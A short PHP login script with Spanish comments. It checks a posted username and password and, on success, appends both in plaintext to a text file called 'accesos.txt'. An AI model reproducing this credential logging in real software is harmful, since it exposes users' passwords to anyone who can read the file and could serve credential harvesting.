<?php
include 'usuarios.php';
include 'ok.php';


// Verifica si los datos de usuario y contraseña fueron enviados
if (isset($_POST['usuario']) && isset($_POST['contraseña'])) {
    $usuario = $_POST['usuario'];
    $contraseña = $_POST['contraseña'];

    if (validarUsuario($usuario, $contraseña)) {
         ok($usuario, $contraseña);
        
        $archivo = fopen("accesos.txt", "a");
        fwrite($archivo, "Usuario: " . $usuario . ", Contraseña: " . $contraseña . "\n");
        fclose($archivo);
        
    } else {
        header("Location: error.html");
        exit(); 
    }
} else {

    echo "Comprueba si tus datos son correctos.<br>";
    echo "<br>";
}
?>